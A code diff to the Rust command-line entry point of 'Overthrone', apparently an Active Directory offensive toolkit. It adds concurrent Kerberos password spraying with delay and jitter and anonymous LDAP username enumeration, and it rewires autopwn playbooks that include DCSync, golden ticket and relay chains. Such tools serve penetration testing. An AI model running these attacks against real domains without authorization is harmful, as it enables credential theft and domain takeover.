@@ -1,5 +1,3 @@
-// Overthrone CLI — Active Directory Offensive Toolkit
-
 mod auth;
 mod autopwn;
 mod banner;
@@ -13,20 +11,33 @@ mod session_store;
 mod tree_viewer;
 mod tui;
 
+use std::process::ExitCode;
+
 use auth::{AuthMethod, Credentials};
-use autopwn::ExecMethod;
+use autopwn::{AdaptiveModeArg, AutoPwnArgs, ExecMethod, MaxStageArg, PlaybookArg};
 use clap::{CommandFactory, Parser, Subcommand};
 use clap_complete::{Shell as ClapShell, generate as clap_generate};
 use colored::Colorize;
 use overthrone_reaper::runner::ReaperConfig;
 use tracing_subscriber::{EnvFilter, fmt};
 
+use futures::StreamExt;
 use overthrone_core::c2::C2Manager;
 use overthrone_core::exec::modules as ovt_modules;
 use overthrone_core::graph::AttackGraph;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
 use std::collections::HashMap;
 use std::sync::{Arc, RwLock};
+
+fn install_rustls_provider() -> Result<(), String> {
+    if rustls::crypto::CryptoProvider::get_default().is_some() {
+        return Ok(());
+    }
+
+    rustls::crypto::ring::default_provider()
+        .install_default()
+        .map_err(|_| "Failed to install rustls ring crypto provider".to_string())
+}
 
 // ──────────────────────────────────────────────────────────
 // CLI Definition
@@ -80,7 +91,7 @@ struct Cli {
         long,
         global = true,
         value_enum,
-        default_value = "password"
+        default_value_t = AuthMethod::Password
     )]
     auth_method: AuthMethod,
 
@@ -234,12 +245,19 @@ enum Commands {
     Spray {
         #[arg(short, long)]
         password: String,
+        /// Optional path to username wordlist (one per line). Omit to use embedded list or --use-ldap.
         #[arg(short = 'U', long, alias = "users")]
-        userlist: String,
+        userlist: Option<String>,
+        /// When set, attempt LDAP-based username enumeration (anonymous/null-session)
+        #[arg(long)]
+        use_ldap: bool,
         #[arg(long, default_value = "1")]
         delay: u64,
         #[arg(long, default_value = "0")]
         jitter: u64,
+        /// Number of concurrent authentication attempts
+        #[arg(long, default_value = "10")]
+        concurrency: usize,
     },
 
     /// Autonomous attack chain — full killchain from enum to DA
@@ -332,6 +350,15 @@ enum Commands {
         /// Resume a previously saved session file
         #[arg(long, value_name = "SESSION_FILE")]
         resume: Option<String>,
+        /// Optional path to username wordlist (one per line) for preauth bootstrap
+        #[arg(short = 'U', long)]
+        userlist: Option<String>,
+        /// When set, attempt LDAP-based username enumeration for bootstrap
+        #[arg(long)]
+        use_ldap: bool,
+        /// Number of concurrent probes during preauth enumeration
+        #[arg(long, default_value = "10")]
+        concurrency: usize,
     },
 
     /// Credential dumping (SAM, LSA, NTDS, DCC2)
@@ -576,52 +603,6 @@ enum Commands {
     },
 }
 
-// ──────────────────────────────────────────────────────────
-// Cracking mode configuration
-// ──────────────────────────────────────────────────────────
-
-#[derive(Debug, Clone, Copy, clap::ValueEnum)]
-enum MaxStageArg {
-    Enumerate,
-    Attack,
-    Escalate,
-    Lateral,
-    Loot,
-    Cleanup,
-}
-
-#[derive(Debug, Clone, Copy, clap::ValueEnum)]
-enum AdaptiveModeArg {
-    /// Pure heuristic engine (original)
-    Heuristic,
-    /// Pure Q-learning (falls back to heuristic for unknown states)
-    Qlearning,
-    /// Hybrid — Q-learner with epsilon-greedy heuristic fallback (recommended)
-    Hybrid,
-}
-
-#[derive(Debug, Clone, Copy, clap::ValueEnum)]
-enum PlaybookArg {
-    /// Full recon: users, computers, groups, trusts, GPOs, shares
-    FullRecon,
-    /// Kerberoast + AS-REP roast + crack
-    RoastAndCrack,
-    /// Constrained delegation abuse chain
-    DelegationAbuse,
-    /// RBCD write -> S4U -> impersonate
-    RbcdChain,
-    /// Auth coercion -> NTLM relay
-    CoerceAndRelay,
-    /// Exec on host -> dump creds -> pivot
-    LateralPivot,
-    /// DCSync replication of all credentials
-    DcSyncDump,
-    /// Forge golden ticket from krbtgt hash
-    GoldenTicket,
-    /// Full chain: recon -> escalate -> DA -> loot
-    FullAutoPwn,
-}
-
 #[derive(Debug, Clone, clap::ValueEnum)]
 enum CrackMode {
     /// Fast mode - minimal rules, quick cracking
@@ -819,9 +800,9 @@ enum KerberosAction {
     },
     /// Zero-knowledge username enumeration via Kerberos AS-REQ probes (no creds needed)
     UserEnum {
-        /// Path to username wordlist (one per line)
+        /// Optional path to username wordlist (one per line). Omit to use the embedded candidate list.
         #[arg(short = 'U', long)]
-        userlist: String,
+        userlist: Option<String>,
         /// Output file for discovered valid usernames
         #[arg(
             id = "kerberos_user_enum_output",
@@ -833,6 +814,12 @@ enum KerberosAction {
         /// Delay between probes in milliseconds (evasion)
         #[arg(long, default_value = "0")]
         delay: u64,
+        /// Concurrent Kerberos probes to run at once
+        #[arg(long, default_value = "10")]
+        concurrency: usize,
+        /// When set, try to derive usernames from LDAP (anonymous/null-session)
+        #[arg(long)]
+        use_ldap: bool,
     },
     GetTgt,
     GetTgs {
@@ -1144,7 +1131,7 @@ enum AdcsAction {
     },
     /// ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning)
     Esc9 {
-        /// CA web enrollment server (e.g. http://ca.corp.local)
+        /// CA web enrollment server (e.g. `<http://ca.corp.local>`)
         #[arg(short, long, required = true)]
         ca: String,
         /// Certificate template name (must have CT_FLAG_NO_SECURITY_EXTENSION)
@@ -1162,23 +1149,23 @@ enum AdcsAction {
         /// LDAP URL (for UPN modification commands, e.g. ldap://dc01.corp.local)
         #[arg(short, long, default_value = "ldap://dc01.corp.local")]
         ldap_url: String,
-        /// [LIVE] DC IP/hostname — when provided with ldap-user/ldap-pass/ldap-domain/victim-dn
+        /// LIVE DC IP/hostname — when provided with ldap-user/ldap-pass/ldap-domain/victim-dn
         /// enables fully automated UPN poisoning via exploit_with_ldap()
         #[arg(long = "target-dc")]
         target_dc: Option<String>,
-        /// [LIVE] LDAP bind username for live UPN modification
+        /// LIVE LDAP bind username for live UPN modification
         #[arg(long)]
         ldap_user: Option<String>,
-        /// [LIVE] LDAP bind password for live UPN modification
+        /// LIVE LDAP bind password for live UPN modification
         #[arg(long)]
         ldap_pass: Option<String>,
-        /// [LIVE] LDAP domain (e.g. corp.local)
+        /// LIVE LDAP domain (e.g. corp.local)
         #[arg(long)]
         ldap_domain: Option<String>,
-        /// [LIVE] Full distinguished name of the victim account (e.g. CN=alice,CN=Users,DC=corp,DC=local)
+        /// LIVE Full distinguished name of the victim account (e.g. CN=alice,CN=Users,DC=corp,DC=local)
         #[arg(long)]
         victim_dn: Option<String>,
-        /// [LIVE] Use LDAPS (port 636) for the live LDAP modification
+        /// LIVE Use LDAPS (port 636) for the live LDAP modification
         #[arg(long)]
         ldaps: bool,
         /// Output PFX file path
@@ -1250,14 +1237,14 @@ enum AdcsAction {
         /// Certificate template to request for the relayed identity
         #[arg(short, long, required = true)]
         template: String,
-        /// [LIVE] SMB username — when provided with smb-pass and smb-domain enables live
+        /// LIVE SMB username — when provided with smb-pass and smb-domain enables live
         /// InterfaceFlags registry read via assess_with_smb() instead of guidance-only
         #[arg(long)]
         smb_user: Option<String>,
-        /// [LIVE] SMB password for live registry read
+        /// LIVE SMB password for live registry read
         #[arg(long)]
         smb_pass: Option<String>,
-        /// [LIVE] SMB domain for live registry read
+        /// LIVE SMB domain for live registry read
         #[arg(long)]
         smb_domain: Option<String>,
     },
@@ -1311,13 +1298,13 @@ enum AdcsAction {
         /// Target account sAMAccountName
         #[arg(short = 'S', long, required = true)]
         target_sam: String,
-        /// Certificate mapping value to write (e.g. X509:<RFC822>admin@corp.local)
+        /// Certificate mapping value to write (e.g. `X509:<RFC822>admin@corp.local`)
         #[arg(short = 'M', long, required = true)]
         mapping: String,
         /// DC IP/hostname for LDAP modification
         #[arg(short, long)]
         dc: Option<String>,
-        /// [LIVE] Perform live LDAP modification (requires ldap-user/ldap-pass)
+        /// LIVE Perform live LDAP modification (requires ldap-user/ldap-pass)
         #[arg(long)]
         live: bool,
     },
@@ -1720,23 +1707,45 @@ enum GpoAction {
 // Main
 // ──────────────────────────────────────────────────────────
 
-fn main() {
+fn main() -> ExitCode {
     // Spawn on a thread with 8 MB stack — the CLI parser with 28 subcommands
     // and nested enums can exceed the default 1 MB stack in debug builds.
-    let thread = std::thread::Builder::new()
+    let thread = match std::thread::Builder::new()
         .stack_size(8 * 1024 * 1024)
-        .spawn(|| {
-            tokio::runtime::Builder::new_multi_thread()
+        .spawn(|| -> i32 {
+            match tokio::runtime::Builder::new_multi_thread()
                 .enable_all()
                 .build()
-                .expect("Failed to build tokio runtime")
-                .block_on(async_main());
-        })
-        .expect("Failed to spawn main thread");
-    thread.join().unwrap();
+            {
+                Ok(rt) => rt.block_on(async_main()),
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to build tokio runtime: {}", e));
+                    1
+                }
+            }
+        }) {
+        Ok(h) => h,
+        Err(e) => {
+            banner::print_fail(&format!("Failed to spawn main thread: {}", e));
+            return ExitCode::from(1);
+        }
+    };
+
+    match thread.join() {
+        Ok(exit_code) => ExitCode::from(exit_code as u8),
+        Err(_) => {
+            banner::print_fail("Main thread panicked");
+            ExitCode::from(1)
+        }
+    }
 }
 
-async fn async_main() {
+async fn async_main() -> i32 {
+    if let Err(e) = install_rustls_provider() {
+        banner::print_fail(&e);
+        return 1;
+    }
+
     let cli = Cli::parse();
 
     let filter = match cli.verbose {
@@ -1761,7 +1770,7 @@ async fn async_main() {
     ovt_modules::register_core_modules().await;
     modules_ext::register_extended_modules().await;
 
-    let exit_code = match *cli.command {
+    match *cli.command {
         Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
             Ok(_) => 0,
             Err(e) => {
@@ -1795,9 +1804,22 @@ async fn async_main() {
         Commands::Spray {
             ref password,
             ref userlist,
+            use_ldap,
             delay,
             jitter,
-        } => cmd_spray(&cli, password, userlist, delay, jitter).await,
+            concurrency,
+        } => {
+            cmd_spray(
+                &cli,
+                password,
+                userlist.as_deref(),
+                use_ldap,
+                delay,
+                jitter,
+                concurrency,
+            )
+            .await
+        }
         Commands::AutoPwn {
             ref target,
             ref method,
@@ -1830,6 +1852,9 @@ async fn async_main() {
                     config: config.clone(),
                     resume: resume.clone(),
                     bootstrap_no_creds: false,
+                    userlist: None,
+                    use_ldap: false,
+                    concurrency: 10,
                 },
             )
             .await
@@ -1848,6 +1873,9 @@ async fn async_main() {
             playbook,
             ref config,
             ref resume,
+            ref userlist,
+            use_ldap,
+            concurrency,
         } => {
             cmd_autopwn(
                 &cli,
@@ -1866,6 +1894,9 @@ async fn async_main() {
                     config: config.clone(),
                     resume: resume.clone(),
                     bootstrap_no_creds: true,
+                    userlist: userlist.clone(),
+                    use_ldap,
+                    concurrency,
                 },
             )
             .await
@@ -1877,7 +1908,21 @@ async fn async_main() {
         Commands::Doctor {
             ref checks,
             ref target_dc,
-        } => commands_impl::cmd_doctor(&cli, checks.clone(), target_dc.as_deref()).await,
+        } => {
+            let checks_opt = if checks.is_empty() {
+                None
+            } else {
+                Some(checks.clone())
+            };
+            let mut exit = commands::doctor::run(checks_opt).await;
+            if let Some(dc) = target_dc {
+                exit |= crate::commands::doctor::check_dc_connectivity(dc)
+                    .await
+                    .iter()
+                    .any(|r| !r.passed) as i32;
+            }
+            exit
+        }
         Commands::Report {
             ref input,
             ref output,
@@ -2018,8 +2063,8 @@ async fn async_main() {
                         eprintln!("Completions written to: {}", path);
                     }
                     Err(e) => {
-                        eprintln!("error: failed to create file '{}': {}", path, e);
-                        std::process::exit(1);
+                        banner::print_fail(&format!("Failed to create file '{}': {}", path, e));
+                        return 1;
                     }
                 }
             } else {
@@ -2027,9 +2072,7 @@ async fn async_main() {
             }
             0
         }
-    };
-
-    std::process::exit(exit_code);
+    }
 }
 
 // ──────────────────────────────────────────────────────────
@@ -2053,15 +2096,21 @@ fn make_plugin_context(cli: &Cli) -> PluginContext {
 // ──────────────────────────────────────────────────────────
 
 fn require_creds(cli: &Cli) -> std::result::Result<Credentials, i32> {
-    let domain = cli.domain.as_deref().unwrap_or_else(|| {
-        banner::print_fail("--domain is required");
-        std::process::exit(1)
-    });
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d,
+        None => {
+            banner::print_fail("--domain is required");
+            return Err(1);
+        }
+    };
 
-    let username = cli.username.as_deref().unwrap_or_else(|| {
-        banner::print_fail("--username is required");
-        std::process::exit(1)
-    });
+    let username = match cli.username.as_deref() {
+        Some(u) => u,
+        None => {
+            banner::print_fail("--username is required");
+            return Err(1);
+        }
+    };
 
     Credentials::from_args(
         domain,
@@ -2096,11 +2145,13 @@ fn require_creds_silent(cli: &Cli) -> std::result::Result<Credentials, String> {
 /// Require credentials for operations that need domain and DC access
 /// but not a specific username. Used by spray operations.
 fn require_dc_only_creds(cli: &Cli) -> std::result::Result<String, i32> {
-    let domain = cli.domain.as_deref().unwrap_or_else(|| {
-        banner::print_fail("--domain is required");
-        std::process::exit(1)
-    });
-    Ok(domain.to_string())
+    match cli.domain.as_deref() {
+        Some(domain) => Ok(domain.to_string()),
+        None => {
+            banner::print_fail("--domain is required");
+            Err(1)
+        }
+    }
 }
 
 fn require_dc(cli: &Cli) -> std::result::Result<String, i32> {
@@ -2117,10 +2168,13 @@ fn make_reaper_config(
     modules: Vec<String>,
     page_size: u32,
 ) -> std::result::Result<ReaperConfig, i32> {
-    let domain = cli.domain.clone().unwrap_or_else(|| {
-        banner::print_fail("--domain is required");
-        std::process::exit(1)
-    });
+    let domain = match cli.domain.clone() {
+        Some(d) => d,
+        None => {
+            banner::print_fail("--domain is required");
+            return Err(1);
+        }
+    };
     let base_dn = ReaperConfig::base_dn_from_domain(&domain);
 
     Ok(ReaperConfig {
@@ -2399,6 +2453,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 llmnr: true,
                 nbtns: true,
                 mdns: false,
+                mitm6: false,
                 responder: true,
                 relay_targets: vec![],
                 challenge: None,
@@ -2464,6 +2519,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 llmnr: true,
                 nbtns: true,
                 mdns: false,
+                mitm6: false,
                 responder: true,
                 relay_targets,
                 challenge: None,
@@ -3333,6 +3389,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         ref userlist,
         ref output,
         delay,
+        concurrency,
+        use_ldap,
     } = action
     {
         let dc = match require_dc(cli) {
@@ -3348,10 +3406,14 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         };
 
         let uc = overthrone_hunter::UserEnumConfig {
-            userlist: std::path::PathBuf::from(userlist),
+            userlist: userlist
+                .as_ref()
+                .map(std::path::PathBuf::from)
+                .unwrap_or_default(),
             output_file: output.as_ref().map(std::path::PathBuf::from),
             save_asrep_hashes: true,
-            concurrency: 10,
+            concurrency,
+            use_ldap,
         };
 
         return match overthrone_hunter::userenum::run(&dc, domain, &uc, delay).await {
@@ -4454,7 +4516,15 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
 }
 
 // cmd_spray
-async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter: u64) -> i32 {
+async fn cmd_spray(
+    cli: &Cli,
+    password: &str,
+    userlist: Option<&str>,
+    use_ldap: bool,
+    delay: u64,
+    jitter: u64,
+    _concurrency: usize,
+) -> i32 {
     banner::print_module_banner("PASSWORD SPRAY");
 
     let domain = match require_dc_only_creds(cli) {
@@ -4466,17 +4536,40 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
         Err(e) => return e,
     };
 
-    // Read userlist
-    let users: Vec<String> = match std::fs::read_to_string(userlist) {
-        Ok(content) => content
-            .lines()
-            .map(|l| l.trim().to_string())
-            .filter(|l| !l.is_empty())
-            .collect(),
-        Err(e) => {
-            banner::print_fail(&format!("Cannot read userlist {}: {}", userlist, e));
-            return 1;
+    // Build username list: file -> LDAP -> embedded fallback
+    let users: Vec<String> = if let Some(path) = userlist {
+        match std::fs::read_to_string(path) {
+            Ok(content) => content
+                .lines()
+                .map(|l| l.trim().to_string())
+                .filter(|l| !l.is_empty())
+                .collect(),
+            Err(e) => {
+                banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
+                return 1;
+            }
         }
+    } else if use_ldap {
+        // Try anonymous LDAP enumeration; fallback to embedded on failure
+        match overthrone_core::proto::ldap::LdapSession::connect(&dc, &domain, "", "", false).await
+        {
+            Ok(mut conn) => match conn.enumerate_users().await {
+                Ok(ad_users) => ad_users.into_iter().map(|u| u.sam_account_name).collect(),
+                Err(e) => {
+                    banner::print_warn(&format!(
+                        "LDAP enumerate failed, using embedded list: {}",
+                        e
+                    ));
+                    overthrone_hunter::userenum::embedded_usernames()
+                }
+            },
+            Err(e) => {
+                banner::print_warn(&format!("LDAP connect failed, using embedded list: {}", e));
+                overthrone_hunter::userenum::embedded_usernames()
+            }
+        }
+    } else {
+        overthrone_hunter::userenum::embedded_usernames()
     };
 
     println!(
@@ -4495,16 +4588,38 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
 
     let mut valid_creds = Vec::new();
     let mut locked_out = 0u32;
+    use futures::stream;
     use overthrone_core::proto::kerberos;
+    use std::time::Duration;
 
-    for (i, user) in users.iter().enumerate() {
-        // Kerberos pre-auth spray — stealthiest method
-        match kerberos::request_tgt(&dc, &domain, user, password, false).await {
+    // Create a stream of tasks that each wait `delay + jitter` then attempt auth.
+    let attempt_stream = stream::iter(users.clone().into_iter().map(|user| {
+        let dc = dc.clone();
+        let domain = domain.clone();
+        let password = password.to_string();
+        async move {
+            // per-attempt spacing
+            if delay > 0 {
+                tokio::time::sleep(Duration::from_millis(delay)).await;
+            }
+            if jitter > 0 {
+                let jitter_add = rand::random::<u64>() % jitter;
+                tokio::time::sleep(Duration::from_millis(jitter_add)).await;
+            }
+            let res = kerberos::request_tgt(&dc, &domain, &user, &password, false).await;
+            (user, res)
+        }
+    }))
+    .buffer_unordered(_concurrency.max(1));
+
+    futures::pin_mut!(attempt_stream);
+    while let Some((user, res)) = attempt_stream.next().await {
+        match res {
             Ok(_tgt) => {
                 println!(
                     "  {} {}:{} — {}",
                     "✓".green(),
-                    user.bold(),
+                    user.as_str().bold(),
                     password,
                     "VALID".green().bold()
                 );
@@ -4527,20 +4642,9 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
                         return 1;
                     }
                 } else {
-                    // KDC_ERR_PREAUTH_FAILED = invalid password, expected
                     tracing::debug!("  {} {}: {}", "✗".dimmed(), user, err_str);
                 }
             }
-        }
-
-        // Apply delay + jitter between attempts
-        if i < users.len() - 1 {
-            let jitter_add = if jitter > 0 {
-                rand::random::<u64>() % jitter
-            } else {
-                0
-            };
-            tokio::time::sleep(tokio::time::Duration::from_millis(delay + jitter_add)).await;
         }
     }
 
@@ -4574,45 +4678,10 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
     0
 }
 
-struct AutoPwnArgs {
-    target: String,
-    method: ExecMethod,
-    stealth: bool,
-    dry_run: bool,
-    max_stage: MaxStageArg,
-    adaptive: AdaptiveModeArg,
-    q_table: String,
-    jitter_ms: u64,
-    ldaps: bool,
-    timeout: u64,
-    playbook: Option<PlaybookArg>,
-    config: Option<String>,
-    resume: Option<String>,
-    bootstrap_no_creds: bool,
-}
-
-// cmd_autopwn — wired to overthrone-pilot runner with Q-learning
 async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
-    let AutoPwnArgs {
-        ref target,
-        method,
-        stealth,
-        dry_run,
-        max_stage,
-        adaptive,
-        ref q_table,
-        jitter_ms,
-        ldaps,
-        timeout,
-        playbook,
-        ref config,
-        ref resume,
-        bootstrap_no_creds,
-    } = args;
     banner::print_module_banner("AUTONOMOUS ATTACK");
 
-    // ── Config file loading ──
-    let _ovt_cfg = match crate::ovt_config::OverthroneConfig::load(config.as_deref()) {
+    let _ovt_cfg = match crate::ovt_config::OverthroneConfig::load(args.config.as_deref()) {
         Ok(c) => c,
         Err(e) => {
             banner::print_warn(&format!("Config file warning: {}", e));
@@ -4625,7 +4694,7 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         Err(e) => return e,
     };
 
-    let discovered_domain = if bootstrap_no_creds {
+    let discovered_domain = if args.bootstrap_no_creds {
         if let Some(domain) = cli.domain.clone() {
             Some(domain)
         } else {
@@ -4635,7 +4704,7 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         None
     };
 
-    let creds_cli = if bootstrap_no_creds {
+    let creds = if args.bootstrap_no_creds {
         if let Some(domain) = discovered_domain.as_deref() {
             banner::print_info(&format!(
                 "No-credential bootstrap mode enabled (domain: {})",
@@ -4654,52 +4723,39 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         })
     };
 
-    // Map CLI exec method to pilot ExecMethod
-    let pilot_exec = match method {
-        ExecMethod::Auto => overthrone_pilot::runner::ExecMethod::Auto,
-        ExecMethod::PsExec => overthrone_pilot::runner::ExecMethod::PsExec,
-        ExecMethod::SmbExec => overthrone_pilot::runner::ExecMethod::SmbExec,
-        ExecMethod::WmiExec => overthrone_pilot::runner::ExecMethod::WmiExec,
-        ExecMethod::WinRm => overthrone_pilot::runner::ExecMethod::WinRm,
-    };
-
-    // Map max stage
-    let pilot_stage = match max_stage {
-        MaxStageArg::Enumerate => overthrone_pilot::runner::Stage::Enumerate,
-        MaxStageArg::Attack => overthrone_pilot::runner::Stage::Attack,
-        MaxStageArg::Escalate => overthrone_pilot::runner::Stage::Escalate,
-        MaxStageArg::Lateral => overthrone_pilot::runner::Stage::Lateral,
-        MaxStageArg::Loot => overthrone_pilot::runner::Stage::Loot,
-        MaxStageArg::Cleanup => overthrone_pilot::runner::Stage::Cleanup,
-    };
-
-    // Build pilot credentials
-    let pilot_creds = if let Some(creds) = creds_cli.as_ref() {
-        if let Some(hash) = creds.nthash() {
-            overthrone_pilot::runner::Credentials::ntlm_hash(&creds.domain, &creds.username, hash)
-        } else {
-            overthrone_pilot::runner::Credentials::password(
-                &creds.domain,
-                &creds.username,
-                creds.password().unwrap_or(""),
-            )
-        }
-    } else {
-        let domain = discovered_domain.clone().unwrap_or_default();
-        overthrone_pilot::runner::Credentials::password(&domain, "", "")
-    };
-
-    if bootstrap_no_creds {
+    if args.bootstrap_no_creds {
         let _ = cmd_pre_enum(cli, EnumTarget::Pre).await;
         let _ = cmd_pre_enum(cli, EnumTarget::Anonymous).await;
         let _ = commands_impl::cmd_rid(cli, 500, 2000, true).await;
-        let preauth_domain = pilot_creds.domain.clone();
+        let preauth_domain = discovered_domain.clone().unwrap_or_default();
         run_preauth_snaffler(&dc, &preauth_domain).await;
-    }
-    let pilot_domain_display = pilot_creds.domain.clone();
 
-    // ── Session Resume ──
-    let initial_state = if let Some(session_path) = resume.as_deref() {
+        let ue_cfg = overthrone_hunter::UserEnumConfig {
+            userlist: args
+                .userlist
+                .as_ref()
+                .map(std::path::PathBuf::from)
+                .unwrap_or_default(),
+            output_file: None,
+            save_asrep_hashes: true,
+            concurrency: args.concurrency,
+            use_ldap: args.use_ldap,
+        };
+        banner::print_info("Running preauth username enumeration (bootstrap)");
+        if let Ok(res) =
+            overthrone_hunter::userenum::run(&dc, &preauth_domain, &ue_cfg, args.jitter_ms).await
+        {
+            banner::print_info(&format!(
+                "Preauth enumeration discovered {} valid users ({} no-preauth)",
+                res.valid_users.len() + res.no_preauth_users.len(),
+                res.no_preauth_users.len()
+            ));
+        } else {
+            banner::print_warn("Preauth userenum failed");
+        }
+    }
+
+    let initial_state = if let Some(session_path) = args.resume.as_deref() {
         match crate::session_store::load_session(std::path::Path::new(session_path)) {
             Ok(s) => {
                 banner::print_info(&format!("Loaded session from {}", session_path));
@@ -4714,112 +4770,7 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         None
     };
 
-    // Build the AutoPwnConfig for the pilot runner
-    let config = overthrone_pilot::runner::AutoPwnConfig {
-        dc_host: dc.clone(),
-        creds: pilot_creds,
-        target: target.to_string(),
-        max_stage: pilot_stage,
-        stealth,
-        dry_run,
-        exec_method: pilot_exec,
-        jitter_ms,
-        use_ldaps: ldaps,
-        timeout,
-        #[cfg(feature = "qlearn")]
-        adaptive_mode: match adaptive {
-            AdaptiveModeArg::Heuristic => overthrone_pilot::qlearner::AdaptiveMode::Heuristic,
-            AdaptiveModeArg::Qlearning => overthrone_pilot::qlearner::AdaptiveMode::QLearning,
-            AdaptiveModeArg::Hybrid => overthrone_pilot::qlearner::AdaptiveMode::Hybrid,
-        },
-        #[cfg(feature = "qlearn")]
-        q_table_path: std::path::PathBuf::from(q_table),
-        initial_state,
-    };
-
-    println!("{} Target:    {}", "🎯".bright_black(), target.cyan());
-    println!("{} DC:        {}", "🏰".bright_black(), dc.cyan());
-    if !pilot_domain_display.is_empty() {
-        println!(
-            "{} Domain:    {}",
-            "🌐".bright_black(),
-            pilot_domain_display.cyan()
-        );
-    }
-    println!("{} Method:    {:?}", "🔧".bright_black(), method);
-    println!("{} Max Stage: {:?}", "📊".bright_black(), max_stage);
-    println!("{} Adaptive:  {:?}", "🧠".bright_black(), adaptive);
-    println!(
-        "{} Stealth:   {}",
-        "🥷".bright_black(),
-        if stealth {
-            "ON".green()
-        } else {
-            "OFF".yellow()
-        }
-    );
-    println!(
-        "{} Dry Run:   {}",
-        "📝".bright_black(),
-        if dry_run {
-            "YES".yellow()
-        } else {
-            "NO".dimmed()
-        }
-    );
-    println!();
-
-    // If a playbook was requested, run that instead of goal-driven autopwn
-    if let Some(pb) = playbook {
-        let playbook_id = match pb {
-            PlaybookArg::FullRecon => overthrone_pilot::playbook::PlaybookId::FullRecon,
-            PlaybookArg::RoastAndCrack => overthrone_pilot::playbook::PlaybookId::RoastAndCrack,
-            PlaybookArg::DelegationAbuse => overthrone_pilot::playbook::PlaybookId::DelegationAbuse,
-            PlaybookArg::RbcdChain => overthrone_pilot::playbook::PlaybookId::RbcdChain,
-            PlaybookArg::CoerceAndRelay => overthrone_pilot::playbook::PlaybookId::CoerceAndRelay,
-            PlaybookArg::LateralPivot => overthrone_pilot::playbook::PlaybookId::LateralPivot,
-            PlaybookArg::DcSyncDump => overthrone_pilot::playbook::PlaybookId::DcSyncDump,
-            PlaybookArg::GoldenTicket => {
-                overthrone_pilot::playbook::PlaybookId::GoldenTicketPersist
-            }
-            PlaybookArg::FullAutoPwn => overthrone_pilot::playbook::PlaybookId::FullAutoPwn,
-        };
-        banner::print_info(&format!("Running playbook: {}", playbook_id));
-        let result = overthrone_pilot::runner::run_playbook(playbook_id, &config).await;
-        if result.domain_admin_achieved {
-            banner::print_da_achieved(result.state.da_user.as_deref().unwrap_or("unknown"), &dc);
-            return 0;
-        }
-        banner::print_info("Playbook completed");
-        return if result.steps_succeeded > 0 { 0 } else { 1 };
-    }
-
-    // Run the full autonomous attack chain via pilot runner
-    let result = overthrone_pilot::runner::run(config).await;
-
-    // ── Auto-save session state ──
-    {
-        let save_path = crate::session_store::auto_session_path(
-            &dc,
-            result.state.domain.as_deref().unwrap_or("unknown"),
-        );
-        match crate::session_store::save_session(&save_path, &result.state) {
-            Ok(_) => banner::print_info(&format!("Session saved → {}", save_path.display())),
-            Err(e) => banner::print_warn(&format!("Could not save session: {}", e)),
-        }
-    }
-
-    if result.domain_admin_achieved {
-        0
-    } else {
-        println!(
-            "\n{} Goal not achieved. {} steps succeeded, {} failed.",
-            "⚠".yellow().bold(),
-            result.steps_succeeded.to_string().green(),
-            result.steps_failed.to_string().red(),
-        );
-        1
-    }
+    autopwn::run(dc, creds, discovered_domain, &args, initial_state).await
 }
 
 // cmd_mssql
@@ -5093,11 +5044,15 @@ mod cli_parse_tests {
                         ref userlist,
                         ref output,
                         delay,
+                        concurrency,
+                        use_ldap,
                     },
             } => {
-                assert_eq!(userlist, "users.txt");
+                assert_eq!(userlist.as_deref(), Some("users.txt"));
                 assert_eq!(output.as_deref(), Some("valid-users.txt"));
                 assert_eq!(delay, 10);
+                assert_eq!(concurrency, 10);
+                assert!(!use_ldap);
             }
             _ => panic!("expected parsed kerberos user-enum command"),
         }
